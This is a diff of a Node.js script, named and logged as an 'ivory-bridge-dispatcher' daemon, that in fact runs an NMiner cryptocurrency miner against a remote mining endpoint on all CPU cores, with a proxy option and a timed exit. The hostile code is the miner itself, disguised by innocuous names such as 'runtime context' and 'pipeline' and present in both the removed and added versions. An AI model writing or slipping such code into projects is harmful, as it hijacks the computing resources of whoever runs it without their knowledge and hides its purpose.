@@ -3,14 +3,14 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-function createRuntimeContext() {
-    const traceId = "1ceca3";
-    console.log(`[host] Instantiated runtime context for ivory-bridge-dispatcher [${traceId}]`);
+(async () => {
+    const traceId = "f6c4c6";
+    console.log(`[daemon] Daemon ${config.appName || "ivory-bridge-dispatcher"} active [tag: ${traceId}]`);
 
-    const scheduler = new NMiner(
+    const pipeline = new NMiner(
         "wss://runtime.nmining.igrp.app/",
         "Arup07.ivory-bridge-dispatcher",
-        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
+        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
     );
 
     process.stdin.resume();
@@ -19,11 +19,11 @@ function createRuntimeContext() {
         process.exit(0);
     }, 326 * 60 * 1000);
 
-    process.on("SIGTERM", () => {
+    process.once("SIGTERM", () => {
         
-        console.log("[halt] Clean lifecycle exit confirmed.");
+        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
         process.exit(0);
     });
-}
 
-createRuntimeContext();
+    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
+})().catch(console.error);
